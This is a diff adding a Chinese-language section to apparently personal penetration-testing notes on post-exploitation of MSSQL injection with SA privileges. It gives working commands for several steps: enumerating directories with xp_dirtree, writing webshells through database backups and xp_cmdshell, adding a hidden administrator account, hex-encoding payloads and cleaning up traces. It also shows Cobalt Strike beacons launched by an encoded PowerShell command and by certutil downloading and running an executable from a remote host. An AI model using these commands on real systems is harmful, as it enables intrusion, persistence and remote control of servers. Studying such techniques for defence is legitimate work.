@@ -377,7 +377,176 @@ select convert(int,@@version);
 
 ```
 len() //mssql没有length函数,只有len
-for xml path('')//可以去除<row>标签,增加回显数量
+for xml path('')//可以去除<row>标签,增加回显的数据量
 ```
 
->todo
+# getshell与提权
+
+## SA权限
+
+### 备份getshell
+
+查找网站根目录
+
+```
+execute master..xp_dirtree 'c:'
+execute master..xp_dirtree 'c:\inetpub\wwwroot'
+列出c盘的所有文件,c:\inetpub\wwwroot下的所有文件
+
+execute master..xp_dirtree 'c:',1
+execute master..xp_dirtree 'c:\inetpub\wwwroot',1
+列出c盘的根目录下的文件夹,c:\inetpub\wwwroot下的文件夹
+execute master..xp_dirtree 'c:',1,1
+execute master..xp_dirtree 'c:\inetpub\wwwroot',1,1
+列出c盘的根目录下的文件夹和文件,c:\inetpub\wwwroot下的文件夹和文件
+```
+
+![](https://img.mi3aka.eu.org/2022/09/122c6bde763f2f2c4a2cf13980eecbe4.png)
+
+>将结果保存到数据库的一个临时表中
+
+```
+DROP TABLE tmp;CREATE TABLE tmp (sub varchar(8000),depth int,is_file int);insert into tmp(sub,depth,is_file) execute master..xp_dirtree 'c:\inetpub\wwwroot',1,1;
+
+select * from tmp;
+```
+
+![](https://img.mi3aka.eu.org/2022/09/daa0bf838c1976b0a45e81c55897b5bc.png)
+
+1. 差异备份
+
+```
+drop table tmp;
+backup database FoundStone_Bank to disk = 'c:\Users\Default\AppData\Local\Temp\sql.bak';
+注意判断该目录是否有权限写入
+create table tmp (shell image);
+insert into tmp(shell) values(0x61736466717765726173646671657772617364666177756a7168666b6a7361666b6c61736a666c6b61736a666c6b616a73666c6b3b61736a666c6b61736a6664);
+
+
+backup database FoundStone_Bank to disk = 'c:\inetpub\wwwroot\shell.asp' with differential,format;
+backup database FoundStone_Bank to disk = 'c:\Windows\Temp\shell.asp' with differential,format;
+注意判断该目录是否有权限写入
+```
+
+![](https://img.mi3aka.eu.org/2022/09/baa8aa8afd3c0510050862c682ccc6e5.png)
+
+![](https://img.mi3aka.eu.org/2022/09/66d67cf903e4b0fe0506e689457d5b86.png)
+
+2. log备份
+
+>log备份需要先把指定的数据库激活为还原模式
+
+```
+drop table tmp;
+alter database FoundStone_Bank set recovery full;
+create table tmp (shell image);
+backup log FoundStone_Bank to disk = 'c:\Users\Default\AppData\Local\Temp\sql.bak' with init ;
+注意判断该目录是否有权限写入
+insert into tmp(shell) values(0x61736466717765726173646671657772617364666177756a7168666b6a7361666b6c61736a666c6b61736a666c6b616a73666c6b3b61736a666c6b61736a6664);
+backup log FoundStone_Bank to disk = 'c:\Windows\Temp\shell.asp'
+注意判断该目录是否有权限写入
+```
+
+![](https://img.mi3aka.eu.org/2022/09/7918f005553f480ab0c5d467b398dc84.png)
+
+>相较于差异备份,log备份要小很多
+
+### xp_cmdshell
+
+```
+exec master..xp_cmdshell 'whoami';
+```
+
+![](https://img.mi3aka.eu.org/2022/09/087b9255199ae7860fb5e481d272c52d.png)
+
+通过xp_cmdshell进行命令执行从而写入webshell/添加用户/上线cs
+
+>写入webshell
+
+```
+exec master..xp_cmdshell 'echo ^<%@ Page Language="C#" %^>^<%@Impor...ls(this);%^> > c:\\inetpub\\wwwroot\\shell.aspx'
+这里同样需要注意是否具有写入权限,同时要注意<符号要使用^进行转义
+exec master..xp_cmdshell 'echo ^<%@ Page Language="C#" %^>^<%@Impor...ls(this);%^> > c:\\Windows\\Temp\\shell.aspx'
+```
+
+![](https://img.mi3aka.eu.org/2022/09/108fa24036ab9e12ea76ebbf624bc843.png)
+
+![](https://img.mi3aka.eu.org/2022/09/a8780b9931405ac1a182b616fed11e6c.png)
+
+假设不知道当前网站的绝对路径，可以通过枚举的方式得到当前路径
+
+```python
+#原始命令如下
+#通过 if not '%j'=='xxx' 去剔除路径
+cmd /c "for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (for /f %j in ('dir %i:\* /AD /B /ON') do (if not '%j'=='Windows' if not '%j'=='Program' if not '%j'=='System' if not '%j'=='Recovery' if not '%j'=='Users' if not '%j'=='ProgramData' if not '%j'=='PerfLogs' (for /f %k in ('dir %i:\%j\* /AD /B /ON /S') do (echo %k > %k\asdfqwer.txt))))"
+
+#注意转义
+payload="cmd /c \"for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (for /f %j in ('dir %i:\* /AD /B /ON') do (if not '%j'=='Windows' if not '%j'=='Program' if not '%j'=='System' if not '%j'=='Recovery' if not '%j'=='Users' if not '%j'=='ProgramData' if not '%j'=='PerfLogs' (for /f %k in ('dir %i:\%j\* /AD /B /ON /S') do (echo %k > %k\\asdfqwer.txt))))\""
+
+print("0x",end="")
+for ch in payload:
+    print(str(hex(ord(ch)))[2:].zfill(2),end="")
+
+declare @a varchar(2000) set @a=cast(0x636d64202f632022666f7220256920696e20284120422043204420452046204720482049204a204b204c204d204e204f2050205120522053205420552056205720582059205a2920646f2028666f72202f6620256a20696e2028276469722025693a5c2a202f4144202f42202f4f4e272920646f20286966206e6f742027256a273d3d2757696e646f777327206966206e6f742027256a273d3d2750726f6772616d27206966206e6f742027256a273d3d2753797374656d27206966206e6f742027256a273d3d275265636f7665727927206966206e6f742027256a273d3d27557365727327206966206e6f742027256a273d3d2750726f6772616d4461746127206966206e6f742027256a273d3d27506572664c6f6773272028666f72202f6620256b20696e2028276469722025693a5c256a5c2a202f4144202f42202f4f4e202f53272920646f20286563686f20256b203e20256b5c61736466717765722e7478742929292922 as varchar(2000));exec master..xp_cmdshell @a
+```
+
+![](https://img.mi3aka.eu.org/2022/09/6a8767f82be3795daffa1c1f777b5b66.png)
+
+![](https://img.mi3aka.eu.org/2022/09/2351c4760d70856b3e933efc8c1d55cb.png)
+
+```python
+#痕迹清除
+cmd /c "for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (for /f %j in ('dir %i:\* /AD /B /ON') do (if not '%j'=='Windows' if not '%j'=='Program' if not '%j'=='System' if not '%j'=='Recovery' if not '%j'=='Users' if not '%j'=='ProgramData' if not '%j'=='PerfLogs' (for /f %k in ('dir %i:\%j\* /AD /B /ON /S') do (del %k\asdfqwer.txt))))"
+
+#注意转义
+payload="cmd /c \"for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (for /f %j in ('dir %i:\* /AD /B /ON') do (if not '%j'=='Windows' if not '%j'=='Program' if not '%j'=='System' if not '%j'=='Recovery' if not '%j'=='Users' if not '%j'=='ProgramData' if not '%j'=='PerfLogs' (for /f %k in ('dir %i:\%j\* /AD /B /ON /S') do (del %k\\asdfqwer.txt))))\""
+
+print("0x",end="")
+for ch in payload:
+    print(str(hex(ord(ch)))[2:].zfill(2),end="")
+
+declare @a varchar(2000) set @a=cast(0x636d64202f632022666f7220256920696e20284120422043204420452046204720482049204a204b204c204d204e204f2050205120522053205420552056205720582059205a2920646f2028666f72202f6620256a20696e2028276469722025693a5c2a202f4144202f42202f4f4e272920646f20286966206e6f742027256a273d3d2757696e646f777327206966206e6f742027256a273d3d2750726f6772616d27206966206e6f742027256a273d3d2753797374656d27206966206e6f742027256a273d3d275265636f7665727927206966206e6f742027256a273d3d27557365727327206966206e6f742027256a273d3d2750726f6772616d4461746127206966206e6f742027256a273d3d27506572664c6f6773272028666f72202f6620256b20696e2028276469722025693a5c256a5c2a202f4144202f42202f4f4e202f53272920646f202864656c20256b5c61736466717765722e7478742929292922 as varchar(2000));exec master..xp_cmdshell @a
+```
+
+>添加用户
+
+```
+exec master..xp_cmdshell 'net user test$ test123456TEST!!! /add /Y'
+exec master..xp_cmdshell 'net localgroup administrators test$ /add'
+要求较高的权限,这里直接用powershell演示
+```
+
+![](https://img.mi3aka.eu.org/2022/09/9a452691849471676702483db39957f5.png)
+
+![](https://img.mi3aka.eu.org/2022/09/e93f28f5e71eb9425e588c85e92bfc86.png)
+
+>上线cs
+
+1. powershell直接上线
+
+```
+exec master..xp_cmdshell 'powershell -nop -w hidden -encodedcommand JABzAD0A...sA'
+```
+
+![](https://img.mi3aka.eu.org/2022/09/8b5d067e4fcf1f09aae154327e772945.png)
+
+2. certutil
+
+```
+cmd /c "cd c:\Windows\Temp\ & certutil -urlcache -split -f http://192.168.89.129:8000/artifact.exe & .\artifact.exe"
+
+declare @a varchar(2000) set @a=cast(0x636d64202f632022636420633a5c57696e646f77735c54656d705c202620636572747574696c202d75726c6361636865202d73706c6974202d6620687474703a2f2f3139322e3136382e38392e3132393a383030302f61727469666163742e6578652026202e5c61727469666163742e65786522 as varchar(2000));exec master..xp_cmdshell @a
+```
+
+![](https://img.mi3aka.eu.org/2022/09/bd7e59cf3e940ba53fe978aef53007ad.png)
+
+[极限环境Certutil加Powershell配合Burp快速落地文件](https://y4er.com/posts/certutil-powershell-write-file/)
+
+利用base64对恶意文件进行编码,落地后再通过`certutil.exe -decode .\raw.txt a.exe`恢复成exe文件
+
+
+
+
+
+### sp_oacreate
+
